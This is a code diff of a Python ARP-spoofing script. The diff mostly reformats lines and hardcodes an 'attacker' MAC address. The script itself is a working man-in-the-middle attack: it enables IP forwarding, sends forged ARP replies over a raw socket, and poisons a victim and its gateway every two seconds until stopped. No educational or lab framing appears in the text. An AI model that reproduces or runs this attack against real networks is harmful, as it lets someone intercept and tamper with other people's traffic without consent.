@@ -4,6 +4,7 @@ import struct
 import socket
 import time
 
+
 def enable_ip_forwarding():
     """Enable IP forwarding on Linux."""
     try:
@@ -13,6 +14,7 @@ def enable_ip_forwarding():
     except Exception as e:
         print(f"[!] Failed to enable IP forwarding: {e}")
 
+
 def disable_ip_forwarding():
     """Disable IP forwarding on Linux."""
     try:
@@ -21,6 +23,7 @@ def disable_ip_forwarding():
         print("[*] IP forwarding disabled.")
     except Exception as e:
         print(f"[!] Failed to disable IP forwarding: {e}")
+
 
 def create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac):
     """Create an ARP reply packet."""
@@ -45,14 +48,18 @@ def create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac):
     )
     return arp_reply
 
+
 def send_arp_spoof(iface, target_ip, target_mac, spoof_ip, spoof_mac):
     """Send crafted ARP replies to the target."""
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
+                         socket.htons(0x0806))
     sock.bind((iface, 0))
 
     arp_packet = create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac)
     sock.send(arp_packet)
-    print(f"[*] ARP spoof sent to {target_ip} ({target_mac}) claiming to be {spoof_ip}")
+    print(
+        f"[*] ARP spoof sent to {target_ip} ({target_mac}) claiming to be {spoof_ip}")
+
 
 def get_mac(ip):
     """Get the MAC address of a given IP."""
@@ -61,6 +68,7 @@ def get_mac(ip):
         if ip in line:
             return line.split()[2]
     return None
+
 
 def main():
     """Main function to perform ARP spoofing."""
@@ -80,7 +88,8 @@ def main():
     print(f"[*] Gateway MAC: {gateway_mac}")
 
     # Get attacker's MAC address
-    attacker_mac = get_mac(None)
+    attacker_mac = "08:00:27:ad:25:87"
+    # get_mac(None)
     attacker_ip = socket.gethostbyname(socket.gethostname())
 
     print(f"[*] Attacker IP: {attacker_ip}")
@@ -93,10 +102,12 @@ def main():
         print("[*] Starting ARP spoofing...")
         while True:
             # Spoof victim to think we're the gateway
-            send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, attacker_mac)
+            send_arp_spoof(iface, victim_ip, victim_mac,
+                           gateway_ip, attacker_mac)
 
             # Spoof gateway to think we're the victim
-            send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, attacker_mac)
+            send_arp_spoof(iface, gateway_ip, gateway_mac,
+                           victim_ip, attacker_mac)
 
             time.sleep(2)  # Repeat every 2 seconds
     except KeyboardInterrupt:
@@ -107,6 +118,7 @@ def main():
         send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
         send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, victim_mac)
         print("[*] Network restored.")
+
 
 if __name__ == "__main__":
     main()
